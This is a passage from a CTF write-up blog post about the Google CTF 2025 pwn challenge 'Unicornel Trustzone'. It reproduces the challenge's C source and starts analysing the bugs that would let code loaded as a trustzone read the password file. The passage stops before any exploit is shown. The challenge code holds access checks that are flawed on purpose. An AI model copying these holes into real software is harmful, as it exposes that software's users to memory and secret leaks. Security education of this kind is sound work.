# Google CTF 2025

> **Source:** Originally published at https://chovid99.github.io/posts/google-ctf-2025
> **Author:** Original author (personal blog / CTF team archive)
> **Retrieved:** 2026-07-13
> **Word count:** 11276
> **Images:** 0 embedded locally

---

Google CTF 2025 - Chovid99's Blog


        **


## Contents


# Google CTF 2025


            * Jul 01, 2025 * 7854 words 
                * 37 minutes 


                    Contents
                    *


-
-
-
-
-
-
-
-
-
            Google CTF 2025


Hi everyone! Life has been quite hectic this year, and looking back, I noticed I’ve only published one blog post in 2025 so far. This realization made me a bit sad, as I really enjoy sharing my CTF experiences through writeups. The fact is, I can probably count the number of CTFs I’ve participated in this year on just one hand, which means I don’t even really play CTFs anymore (which is why I rarely write in this blog). I’m hoping to get back to writing more regularly when time permits.


During Google CTF this year, my schedule was pretty tight, so I couldn’t contribute much to my team **Blue Water. I only managed to look at two challenges, which are unicornel trustzone and webz. While I solved unicornel trustzone, I unfortunately didn’t have enough time to tackle webz properly. That said, webz was a fascinating challenge that I’d love to revisit and solve when I get some free time.


So, this time, I will share my writeup for the unicornel trustzone challenge.


# Pwn


## Unicornel Trustzone


            *Description*


Unicornel was broken, on that we will concur


But I’ve removed all of the bugs now, I am quite sure


Author: roguebantha


### Initial Analysis


In this challenge, we were given a zip file containing two main files: `chal.c` and `syscalls.c`. Let’s first take a look at `chal.c` to understand what the application is trying to do.


```
  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231

```


```
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <poll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include "unicorn/unicorn.h"
#include "unicornel.h"
pthread_mutex_t task_lock = PTHREAD_MUTEX_INITIALIZER;
struct pollfd pfds[MAX_PROCESSES + 1];
struct process* processes[MAX_PROCESSES];
unsigned next_pid = 1;
unsigned long ARG_REGR(struct process* current,unsigned reg) {
  unsigned long _ = 0;
  uc_reg_read(current->uc,call_regs[current->arch][reg],&_);
  return _;
}
void ARG_REGW(struct process* current,unsigned reg, unsigned long value)
{
  uc_reg_write(current->uc,call_regs[current->arch][reg],&value);
}
void hook_call(uc_engine* uc, unsigned intno, void* user_data)
{
  struct process* current = user_data;
  unsigned long syscall_no = ARG_REGR(current,0);
  fprintf(stderr,"pid %d: syscall with value %lu\n",(int)current->pid,syscall_no);
  fflush(stderr);
  if(syscall_no == 0xff)
  {
    //Loop detected - let me save us all some blushes and just stop
    uc_emu_stop(current->uc);
    return;
  }
  //Check for OOB syscall number?
  if(syscall_no > 12) {
    ARG_REGW(current,0,0xff);
    return;
  }
  unsigned long ret = syscalls[syscall_no](current);
  ARG_REGW(current,0,ret);
}

//Must be holding task lock
int destroy_process(struct process* current)
{
  //If this happens something has gone terribly wrong in our bookkeeping. Panic.
  if(processes[current->pid] != current)
    abort();
  processes[current->pid] = NULL;
  if(current->trusted_zone_hook)
    uc_hook_del(current->uc,current->trusted_zone_hook);
  uc_close(current->uc);
  close(current->outfd);
  free(current);
  return 0;
}

void* process_thread(void* param)
{
  struct process* current = param;
  uc_err e = uc_emu_start(current->uc,current->entrypoint,current->entrypoint + current->code_length,0,0);
  unsigned long ip = 0;
  uc_reg_read(current->uc,ip_reg[current->arch],&ip);
  printf("Process %u finished with status %s at address %lu\n",(unsigned) current->pid,uc_strerror(e),ip);
  fflush(stdout);
  pthread_mutex_lock(&task_lock);
  destroy_process(current);
  pthread_mutex_unlock(&task_lock);
  pthread_exit(NULL);
}

//Must be holding task lock
int find_free_process()
{
  for(unsigned int i = 0; i < MAX_PROCESSES; i++)
  {
    /* We check pfds here to avoid a race between destroy_process ending a task and the
      main poll thread reaping the read end of the pipe
    */
    if(processes[i] == NULL && pfds[i].fd == -1)
      return i;
  }
  return -1;
}
int start_process()
{
  pthread_mutex_lock(&task_lock);
  int pid = find_free_process();
  if(pid < 0)
  {
    printf("At max processes already\n");
    pthread_mutex_unlock(&task_lock);
    return -1;
  }
  struct unicornelf process_data;
  //Signal to client that we're ready to receive process_data
  printf("DATA_START\n");
  int ret = read(0,&process_data,sizeof(process_data));
  if(ret != sizeof(process_data)) {
    printf("Unexpected read size\n");
    pthread_mutex_unlock(&task_lock);
    return -1;
  }
  if(!process_data.code_length || !process_data.num_maps || process_data.num_maps > 4 || process_data.code_length > process_data.maps[0].length)
  {
    printf("Malformed process data\n");
    pthread_mutex_unlock(&task_lock);
    return -1;
  }
  //Only allow one process per architecture
  if(process_data.arch >= UC_ARCH_MAX || process_data.arch < 1)
  {
    printf("Invalid arch specified\n");
    pthread_mutex_unlock(&task_lock);
    return -1;
  }
  char* code_recv = calloc(1,process_data.code_length);
  //Signal to client that we're ready to receive process code
  printf("CODE_START\n");
  fflush(stdout);
  read(0,code_recv,process_data.code_length);
  uc_engine *uc;
  uc_err err;
  err = uc_open(process_data.arch,process_data.mode,&uc);
  if(err != UC_ERR_OK) {
    printf("Failed on uc_open() %u %u with error %u\n",process_data.arch,process_data.mode,err);
    pthread_mutex_unlock(&task_lock);
    free(code_recv);
    return -1;
  }
  for(unsigned i = 0; i < process_data.num_maps; i++)
  {
    err = uc_mem_map(uc,process_data.maps[i].va,process_data.maps[i].length,UC_PROT_ALL);
    if(err != UC_ERR_OK)
    {
      printf("Failed on uc_mem_map() with error %u\n",err);
      free(code_recv);
      uc_close(uc);
      pthread_mutex_unlock(&task_lock);
      return -1;
    }
  }
  err = uc_mem_write(uc,process_data.maps[0].va,code_recv,process_data.code_length);
  free(code_recv);
  if(err != UC_ERR_OK)
  {
    printf("failed on uc_mem_write() with error %u\n",err);
    uc_close(uc);
    pthread_mutex_unlock(&task_lock);
    return -1;
  }
  uc_hook trace;
  int pipefds[2];
  pipe(pipefds);

  pfds[pid].fd = pipefds[0];
  pfds[pid].events = POLLIN;
  pfds[pid].revents = 0;
  struct process* new_process = calloc(1,sizeof(struct process));
  new_process->pid = pid;
  new_process->outfd = pipefds[1];
  new_process->uc = uc;
  new_process->trusted_zone_hook = 0;
  new_process->trustzone_mode = false;
  new_process->arch = process_data.arch;
  new_process->entrypoint = process_data.maps[0].va;
  new_process->code_length = process_data.code_length;
  memcpy(new_process->maps,process_data.maps,sizeof(process_data.maps));
  new_process->num_maps = process_data.num_maps;
  processes[pid] = new_process;
  err = uc_hook_add(uc,&trace,UC_HOOK_INTR,hook_call,new_process,1,0);
  if(err != UC_ERR_OK)
  {
    printf("failed on uc_hook_add() with error %u\n",err);
    destroy_process(new_process);
    pthread_mutex_unlock(&task_lock);
    return -1;
  }
  pthread_attr_t attr;
  pthread_attr_init(&attr);
  pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
  int pthread_err = pthread_create(&new_process->thread,&attr,process_thread,new_process);
  if(pthread_err != 0)
  {
    printf("failed to create pthread\n");
    destroy_process(new_process);
  }
  else {
    printf("new process created with pid %d\n",pid);
  }
  pthread_mutex_unlock(&task_lock);
  return pthread_err;
}
int main(int argc, char *argv[]) {
  pfds[MAX_PROCESSES].fd = 0 /* stdin */;
  pfds[MAX_PROCESSES].events = POLLIN;
  pfds[MAX_PROCESSES].revents = 0;
  for(unsigned int i = 0; i < MAX_PROCESSES; i++) {
    pfds[i].fd = -1;
    pfds[i].events = POLLIN;
    pfds[i].revents = 0;
  }
  printf("Welcome to the unicornel!\n");
  fflush(stdout);
  pthread_mutex_init(&task_lock,NULL);
  while(1) {
    poll(pfds,MAX_PROCESSES + 1,-1);
    for(unsigned i = 0; i < MAX_PROCESSES; i++) {
      //Data available from emulated process
      if(pfds[i].revents & POLLIN) {
        int nbytes;
        ioctl(pfds[i].fd,FIONREAD,&nbytes);
        splice(pfds[i].fd,0,1 /* stdout */,0,nbytes,0);
      }
      //Process ended, and the write end of the pipe was closed in destroy_process. Finish cleanup
      if(pfds[i].revents & POLLHUP) {
        close(pfds[i].fd);
        pfds[i].fd = -1;
      }
    }
    if(pfds[MAX_PROCESSES].revents & POLLIN) {
      //Received new process data
      start_process();
      fflush(stdout);
    }
  }
  return 0;
}

```


The code above is quite long with a lot of implementation details, but let me summarize what it does at a high level. Basically, this program implements a custom process emulation system using the Unicorn emulation engine. When we interact with the program, we can spawn new processes that will be emulated in their own threads. Each emulated process can perform syscalls through a custom syscall interface (defined in `syscalls.c`) to interact with the host system. The program handles I/O between the emulated processes and the host system.


Now, let’s take a look at the `syscalls.c` file and analyze it:


```
  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261

```


```
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <poll.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include "unicorn/unicorn.h"
#include "unicornel.h"

#define PAGE_SHIFT      12
#define PAGE_SIZE       (1UL << PAGE_SHIFT)
#define PAGE_MASK       (~(PAGE_SIZE-1))

#define PAGE_ALIGN(addr)        (((addr)+PAGE_SIZE-1)&PAGE_MASK)
#define TRUSTED_SYSCALL if(!current->trustzone_mode) return -0xff
char password[16] = { 0 };
/* I'm reusing MAX_PROCESSES here, but there's not a 1:1 mapping of shared buffers to processes.
 * a process can create multiple shared mappings */
struct shared_buffer shared_buffers[MAX_PROCESSES] = { 0 };
long create_shared(struct process* current) {
    // TRUSTED_SYSCALL;

    pthread_mutex_lock(&task_lock);
    unsigned long length = ARG_REGR(current,1);
    if(length > 0x10000 || !length || length & 0xFFF)
    {
        pthread_mutex_unlock(&task_lock);
        return -1;
    }
    //Find an empty shared buffer handle
    unsigned long handle;
    for(handle = 0; handle < MAX_PROCESSES; handle++) {
        if(!shared_buffers[handle].refs)
            break;
    }
    if(handle == MAX_PROCESSES) {
        pthread_mutex_unlock(&task_lock);
        return -2;
    }
    void* buffer = calloc(1,length);
    if(!buffer) {
        pthread_mutex_unlock(&task_lock);
        return -3;
    }
    shared_buffers[handle].refs = 1;
    shared_buffers[handle].buffer = buffer;
    shared_buffers[handle].length = length;
    pthread_mutex_unlock(&task_lock);
    return handle;
}
long validate_handle(struct process* current) {
    TRUSTED_SYSCALL;

    pthread_mutex_lock(&task_lock);
    unsigned long handle = ARG_REGR(current,1);
    unsigned long length = ARG_REGR(current,2);
    if(handle >= MAX_PROCESSES || !shared_buffers[handle].refs || shared_buffers[handle].length < length) {
        pthread_mutex_unlock(&task_lock);
        return 0;
    }
    pthread_mutex_unlock(&task_lock);
    return (long) shared_buffers[handle].buffer;
}
long map_address(struct process* current)
{
    TRUSTED_SYSCALL;

    unsigned long addr = ARG_REGR(current,1);
    unsigned long length = ARG_REGR(current,2);
    void* buffer = (void*) ARG_REGR(current,3);
    fprintf(stderr,"Mapping %p @ %p length %lu\n",buffer,addr,length);
    uc_err e = uc_mem_map_ptr(current->uc,addr,length,UC_PROT_ALL,buffer);
    return e;
}
bool overlaps_tz(struct process* current,long src, unsigned n) {
    return current->trusted_zone_hook && !(src + n <= current->trustzone || current->trustzone + PAGE_ALIGN(current->tz_size) <= src);
}
uc_err safe_read(struct process* current, char* dst, long src, size_t n) {
    if(overlaps_tz(current,src,n)) TRUSTED_SYSCALL;
    return uc_mem_read(current->uc,src,dst,n);
}
uc_err strncpy_user(struct process* current, char* dst, long src, size_t n) {
    uc_err e;
    if(overlaps_tz(current,src,n)) TRUSTED_SYSCALL;
    for(unsigned i = 0; i < n; i++) {
        e = uc_mem_read(current->uc,src+i,dst+i,1);
        if(e != UC_ERR_OK)
            return e;
        if(!dst[i])
            return UC_ERR_OK;
    }
    dst[n-1] = 0;
    return UC_ERR_OK;
}

long unicornel_write(struct process* current) {
    unsigned long pointer = ARG_REGR(current,1);
    unsigned long length =  ARG_REGR(current,2);
    char* buffer = malloc(length);
    if(!buffer) return -1;
    uc_err err = safe_read(current,buffer,pointer,length);
    if(err != UC_ERR_OK) {
        free(buffer);
        return -1;
    }
    long ret = write(current->outfd,buffer,length);
    free(buffer);
    return ret;
}
//You're welcome
long print_integer(struct process* current) {
    dprintf(current->outfd,"%ld\n",ARG_REGR(current,1));
    return 0;
}
//Also called when the trustzone returns
long unicornel_exit(struct process* current) {
    uc_emu_stop(current->uc);
    return 0;
}

long unicornel_pause(struct process* current) {
    current->paused = true;
    while(current->paused);
    return 0;
}
long unicornel_resume(struct process* current) {
    unsigned long pid = ARG_REGR(current,1);
    pthread_mutex_lock(&task_lock);
    if(pid > MAX_PROCESSES || !processes[pid] || !processes[pid]->paused)
    {
        pthread_mutex_unlock(&task_lock);
        return -1;
    }
    processes[pid]->paused = false;
    pthread_mutex_unlock(&task_lock);
    return 0;
}
//The trustzone is allowed to access trusted memory, no one else is.
void trusted_read(uc_engine *uc, uc_mem_type type, uint64_t address, int size, int64_t value, void* user_data) {
    struct process* current = user_data;
    fprintf(stderr,"TRUSTED READ: %p %p\n",address,current->trustzone);
    if(!current->trustzone_mode) {
        //Untrusted code tried to access trusted memory, abort the malicious process
        printf("Unprivileged access to trustzone attempted! Killing process\n");
        uc_emu_stop(uc);
    }
}
long memprot(struct process* current) {
    TRUSTED_SYSCALL;
    unsigned long addr = ARG_REGR(current,1);
    unsigned long length = ARG_REGR(current,2);
    unsigned long prot = ARG_REGR(current,3);
    return uc_mem_protect(current->uc,addr,length,prot);
}
long create_trustzone(struct process* current) {
    if(current->trusted_zone_hook)
        return -1;
    uc_engine* uc = current->uc;
    unsigned long addr = ARG_REGR(current,1);
    unsigned long filename_user = ARG_REGR(current,2);
    char filename[128] = { 0 };
    uc_err err = strncpy_user(current,filename,filename_user,sizeof(filename));
    if(err != UC_ERR_OK) {
        printf("Failed to copy string from address %p\n",filename_user);
        return -1;
    }
    for(unsigned i = 0; i < sizeof(filename); i++) {
        if(filename[i] == '.' || filename[i] == '/') {
            filename[i] = '_';
        }
    }
    int fd = open(filename,O_RDONLY);
    if(fd == -1) {
        printf("Failed to open trustzone %s %m\n",filename);
        return errno;
    }
    off_t size = lseek(fd,0,SEEK_END);
    err = uc_mem_map(uc,addr,PAGE_ALIGN(size),UC_PROT_READ | UC_PROT_EXEC);
    if(err != UC_ERR_OK)
    {
      printf("Failed on uc_mem_map() with error %u\n",err);
      close(fd);
      return -1;
    }
    err = uc_hook_add(uc,&current->trusted_zone_hook,UC_HOOK_MEM_READ,trusted_read,current,addr,addr+PAGE_ALIGN(size));
    if(err != UC_ERR_OK) {
      printf("Failed on uc_hook_add() with error %u\n",err);
      close(fd);
      uc_mem_unmap(uc,addr,PAGE_ALIGN(size));
      return -1;
    }
    char* file = calloc(size,1);
    lseek(fd,0,SEEK_SET);
    read(fd,file,size);
    uc_mem_write(uc,addr,file,size);
    current->trustzone = addr;
    current->tz_size = size;
    close(fd);
    fprintf(stderr,"Trustzone allocated at %p %lu\n",addr,PAGE_ALIGN(size));
    return 0;
}
long destroy_trustzone(struct process* current) {
    if(!current->trusted_zone_hook)
        return -1;
    uc_mem_unmap(current->uc,current->trustzone,PAGE_ALIGN(current->tz_size));
    uc_hook_del(current->uc,current->trusted_zone_hook);
    current->trusted_zone_hook = false;
    current->trustzone = 0;
    current->tz_size = 0;
    return 0;
}
long confirm_password(struct process* current) {
    TRUSTED_SYSCALL;
    if(!password[0]) {
        int password_fd = open("password",O_RDONLY);
        if(password_fd == -1)
        {
            printf("open password failed: %m\n");
            abort();
        }
        read(password_fd,password,16);
        close(password_fd);
    }
    char user_password[sizeof(password)];
    uc_err e = strncpy_user(current,user_password,ARG_REGR(current,1),sizeof(user_password));
    if(e != UC_ERR_OK) {
        return 1;
    }
    return !!strncmp(user_password,password,sizeof(user_password));
}
long trustzone_invoke(struct process* current) {
    if(!current->trusted_zone_hook)
        return -1;
    current->trustzone_mode = true;
    unsigned long ip = 0;
    uc_reg_read(current->uc,ip_reg[current->arch],&ip);

    uc_err err = uc_emu_start(current->uc,current->trustzone,current->trustzone + current->tz_size,0,0);
    current->trustzone_mode = false;
    fprintf(stderr,"trustzone over %s\n",uc_strerror(err));
    uc_reg_write(current->uc,ip_reg[current->arch],&ip);
    return err;
}

long (*syscalls[])(struct process* current) = {
    unicornel_exit, //0
    unicornel_write, //1
    print_integer, //2
    create_shared, //3
    validate_handle, //4
    map_address, //5
    unicornel_pause, //6
    unicornel_resume, //7
    create_trustzone, //8
    destroy_trustzone, //9
    trustzone_invoke, //10
    confirm_password, //11
    memprot, //12
};

```


To recap, basically it implements 13 syscalls that can be called in our emulated program. We won’t deep dive into all syscalls, but let’s examine some important ones after this.


First, we need to understand that the code implements a `trustzone` mechanism. The trustzone is a secure execution environment where certain privileged syscalls can only be executed. This is enforced by the `TRUSTED_SYSCALL` macro which checks if `trustzone_mode` is enabled before allowing the syscall to proceed.


The trustzone mechanism works by having a special execution mode controlled by the `trustzone_mode` flag. Programs can create a trustzone using the `create_trustzone` syscall which sets up a region of code that can be executed via `trustzone_invoke`. When `trustzone_invoke` is called, it temporarily sets `trustzone_mode` to true, executes the trustzone code, and then sets it back to false. While in trustzone mode, the program can execute privileged syscalls like `validate_handle`, `map_address`, `memprot`, etc, that are protected by the `TRUSTED_SYSCALL` macro. This provides a way to isolate sensitive operations and only allow them to be performed from within the trustzone context.


The trustzone code itself is protected from the normal emulated program in two ways. First, when the trustzone region is created, it is mapped with `r-x` (read-execute) permissions, preventing the normal program from writing to that memory area. Second, a hook is added to prevent the normal program from executing any instructions that could read the contents of the trustzone memory addresses directly. These two protections are intended to ensure that sensitive trustzone code cannot be tampered with or leaked by the unprivileged emulated program.


Now that we understand how the trustzone mechanism works at a high level, let’s take a closer look at some of the key syscalls that implement this functionality. The syscalls array defines 13 different syscalls (numbered 0-12) that can be called from the emulated program. We’ll focus on the ones most relevant to the trustzone implementation and memory management:


**create_shared


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31

```


```
long create_shared(struct process* current) {
    // TRUSTED_SYSCALL;

    pthread_mutex_lock(&task_lock);
    unsigned long length = ARG_REGR(current,1);
    if(length > 0x10000 || !length || length & 0xFFF)
    {
        pthread_mutex_unlock(&task_lock);
        return -1;
    }
    //Find an empty shared buffer handle
    unsigned long handle;
    for(handle = 0; handle < MAX_PROCESSES; handle++) {
        if(!shared_buffers[handle].refs)
            break;
    }
    if(handle == MAX_PROCESSES) {
        pthread_mutex_unlock(&task_lock);
        return -2;
    }
    void* buffer = calloc(1,length);
    if(!buffer) {
        pthread_mutex_unlock(&task_lock);
        return -3;
    }
    shared_buffers[handle].refs = 1;
    shared_buffers[handle].buffer = buffer;
    shared_buffers[handle].length = length;
    pthread_mutex_unlock(&task_lock);
    return handle;
}

```


This syscall allocates a new buffer and stores it in the `shared_buffers` array so it can be accessed by multiple processes. It returns a handle that other processes can use to reference this shared buffer.


**validate_handle


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13

```


```
long validate_handle(struct process* current) {
    TRUSTED_SYSCALL;

    pthread_mutex_lock(&task_lock);
    unsigned long handle = ARG_REGR(current,1);
    unsigned long length = ARG_REGR(current,2);
    if(handle >= MAX_PROCESSES || !shared_buffers[handle].refs || shared_buffers[handle].length < length) {
        pthread_mutex_unlock(&task_lock);
        return 0;
    }
    pthread_mutex_unlock(&task_lock);
    return (long) shared_buffers[handle].buffer;
}

```


This syscall is used to validate a shared buffer handle and get its address. This syscall is protected by `TRUSTED_SYSCALL` to prevent unprivileged code from getting shared buffer addresses directly.


**map_address


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11

```


```
long map_address(struct process* current)
{
    TRUSTED_SYSCALL;

    unsigned long addr = ARG_REGR(current,1);
    unsigned long length = ARG_REGR(current,2);
    void* buffer = (void*) ARG_REGR(current,3);
    fprintf(stderr,"Mapping %p @ %p length %lu\n",buffer,addr,length);
    uc_err e = uc_mem_map_ptr(current->uc,addr,length,UC_PROT_ALL,buffer);
    return e;
}

```


This syscall maps a shared buffer into the process’s address space at a specified address. It uses `uc_mem_map_ptr()` to create a mapping with full permissions (`UC_PROT_ALL`) between the specified address in the emulated process’s address space and the provided host buffer. This syscall is protected by `TRUSTED_SYSCALL` since it allows arbitrary memory mapping between the emulated process’s address space and any location in the host’s address space, which could be dangerous if misused. The mapping allows the emulated process to read/write/execute the mapped memory region.


**create_trustzone


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57

```


```
//The trustzone is allowed to access trusted memory, no one else is.
void trusted_read(uc_engine *uc, uc_mem_type type, uint64_t address, int size, int64_t value, void* user_data) {
    struct process* current = user_data;
    fprintf(stderr,"TRUSTED READ: %p %p\n",address,current->trustzone);
    if(!current->trustzone_mode) {
        //Untrusted code tried to access trusted memory, abort the malicious process
        printf("Unprivileged access to trustzone attempted! Killing process\n");
        uc_emu_stop(uc);
    }
}
long create_trustzone(struct process* current) {
    if(current->trusted_zone_hook)
        return -1;
    uc_engine* uc = current->uc;
    unsigned long addr = ARG_REGR(current,1);
    unsigned long filename_user = ARG_REGR(current,2);
    char filename[128] = { 0 };
    uc_err err = strncpy_user(current,filename,filename_user,sizeof(filename));
    if(err != UC_ERR_OK) {
        printf("Failed to copy string from address %p\n",filename_user);
        return -1;
    }
    for(unsigned i = 0; i < sizeof(filename); i++) {
        if(filename[i] == '.' || filename[i] == '/') {
            filename[i] = '_';
        }
    }
    int fd = open(filename,O_RDONLY);
    if(fd == -1) {
        printf("Failed to open trustzone %s %m\n",filename);
        return errno;
    }
    off_t size = lseek(fd,0,SEEK_END);
    err = uc_mem_map(uc,addr,PAGE_ALIGN(size),UC_PROT_READ | UC_PROT_EXEC);
    if(err != UC_ERR_OK)
    {
      printf("Failed on uc_mem_map() with error %u\n",err);
      close(fd);
      return -1;
    }
    err = uc_hook_add(uc,&current->trusted_zone_hook,UC_HOOK_MEM_READ,trusted_read,current,addr,addr+PAGE_ALIGN(size));
    if(err != UC_ERR_OK) {
      printf("Failed on uc_hook_add() with error %u\n",err);
      close(fd);
      uc_mem_unmap(uc,addr,PAGE_ALIGN(size));
      return -1;
    }
    char* file = calloc(size,1);
    lseek(fd,0,SEEK_SET);
    read(fd,file,size);
    uc_mem_write(uc,addr,file,size);
    current->trustzone = addr;
    current->tz_size = size;
    close(fd);
    fprintf(stderr,"Trustzone allocated at %p %lu\n",addr,PAGE_ALIGN(size));
    return 0;
}

```


This syscall sets up a new trustzone region by loading code from an existing file in the system. It takes a file path and loads the code from that file into a new memory region that is mapped as `r-x` only, preventing any writes to the trustzone code. The syscall adds a `UC_HOOK_MEM_READ` hook that triggers the `trusted_read` callback function whenever there is any attempt to read from the trustzone memory region. This hook ensures that if code tries to read trustzone memory while not in trustzone mode (`trustzone_mode` = false), the emulation will be stopped immediately.


Another important observation is that there isn’t any `HOOK` set for memory writes. This means the emulated program is actually **ALLOWED to overwrite the `trustzone`. However, by default, the mapping address is `r-x`, so we can’t write to the created trustzone. We will keep this in mind for now.


**destroy_trustzone


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10

```


```
long destroy_trustzone(struct process* current) {
    if(!current->trusted_zone_hook)
        return -1;
    uc_mem_unmap(current->uc,current->trustzone,PAGE_ALIGN(current->tz_size));
    uc_hook_del(current->uc,current->trusted_zone_hook);
    current->trusted_zone_hook = false;
    current->trustzone = 0;
    current->tz_size = 0;
    return 0;
}

```


This syscall handles the cleanup of a trustzone region. When called, it removes all the memory protections and hooks that were previously set up to protect the trustzone. It then frees any resources that were allocated for the trustzone and resets all the associated trustzone state back to its initial values.


**trustzone_invoke


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13

```


```
long trustzone_invoke(struct process* current) {
    if(!current->trusted_zone_hook)
        return -1;
    current->trustzone_mode = true;
    unsigned long ip = 0;
    uc_reg_read(current->uc,ip_reg[current->arch],&ip);

    uc_err err = uc_emu_start(current->uc,current->trustzone,current->trustzone + current->tz_size,0,0);
    current->trustzone_mode = false;
    fprintf(stderr,"trustzone over %s\n",uc_strerror(err));
    uc_reg_write(current->uc,ip_reg[current->arch],&ip);
    return err;
}

```


This syscall handles the execution of code within the trustzone’s secure context. When invoked, it first enables trustzone mode by setting the `trustzone_mode` flag to true. This allows the trustzone code to execute with elevated privileges and access protected syscalls. Once the trustzone code finishes executing, the syscall resets the `trustzone_mode` flag back to false, returning execution to the normal unprivileged context. This mechanism ensures that privileged operations can only be performed within the controlled trustzone environment.


**memprot


```
1
2
3
4
5
6
7

```


```
long memprot(struct process* current) {
    TRUSTED_SYSCALL;
    unsigned long addr = ARG_REGR(current,1);
    unsigned long length = ARG_REGR(current,2);
    unsigned long prot = ARG_REGR(current,3);
    return uc_mem_protect(current->uc,addr,length,prot);
}

```


This syscall is used to change the permission of the memory. When called, it takes a memory address and length to specify the region to modify, along with protection flags indicating the desired access rights. The syscall then updates the permissions on that memory region accordingly, allowing the system to enforce restrictions on whether the memory can be read from, written to, or executed as code. Like other sensitive operations, this syscall is protected by the `TRUSTED_SYSCALL` macro to ensure it can only be called from within the trustzone context.


Now, if we read through the `Documentation` that was given in the chal, we can see that there are three available trustzones that we can load and use in our emulated program:


- `create_map_shared_x86_64`: This trustzone creates and maps a shared memory buffer.

- `map_shared_x86_64`: This trustzone maps an existing shared memory buffer to the process’s address space.

- `memprot_x86_64`: This trustzone changes memory protection flags for the process’s address space, but requires password authentication.


So basically, we already have some context on how the app works. At first, the program looked quite safe to me, but after digging more through the code, I made some observations that revealed the app has bugs.


First, observed that in the `confirm_password` method below


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19

```


```
long confirm_password(struct process* current) {
    TRUSTED_SYSCALL;
    if(!password[0]) {
        int password_fd = open("password",O_RDONLY);
        if(password_fd == -1)
        {
            printf("open password failed: %m\n");
            abort();
        }
        read(password_fd,password,16);
        close(password_fd);
    }
    char user_password[sizeof(password)];
    uc_err e = strncpy_user(current,user_password,ARG_REGR(current,1),sizeof(user_password));
    if(e != UC_ERR_OK) {
        return 1;
    }
    return !!strncmp(user_password,password,sizeof(user_password));
}

```


The password was actually stored in a file named `password`. If we take a look back at the `create_trustzone` function, there isn’t any validation actually whether the loaded file contains valid instructions or not. So, we can actually load `password` file and mapped the content to our process address space.


So basically, if we do this, we can make the `password` contents exist in the process memory, but we need to find a way to somehow leak the content, because remember that the intention of the challenge is that the unprivileged program shouldn’t be able to access the `trustzone` area, and the content of `password` is in that area.


However, I noticed something when I checked how the `unicornel_write` syscall was implemented.


**unicornel_write


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21

```


```
bool overlaps_tz(struct process* current,long src, unsigned n) {
    return current->trusted_zone_hook && !(src + n <= current->trustzone || current->trustzone + PAGE_ALIGN(current->tz_size) <= src);
}
uc_err safe_read(struct process* current, char* dst, long src, size_t n) {
    if(overlaps_tz(current,src,n)) TRUSTED_SYSCALL;
    return uc_mem_read(current->uc,src,dst,n);
}
long unicornel_write(struct process* current) {
    unsigned long pointer = ARG_REGR(current,1);
    unsigned long length =  ARG_REGR(current,2);
    char* buffer = malloc(length);
    if(!buffer) return -1;
    uc_err err = safe_read(current,buffer,pointer,length);
    if(err != UC_ERR_OK) {
        free(buffer);
        return -1;
    }
    long ret = write(current->outfd,buffer,length);
    free(buffer);
    return ret;
}

```


This syscall is responsible for writing data from the emulated process’s memory to the output file descriptor. I observed that:


- Before reading memory, it calls `overlaps_tz()` to check if the requested memory region overlaps with the trustzone

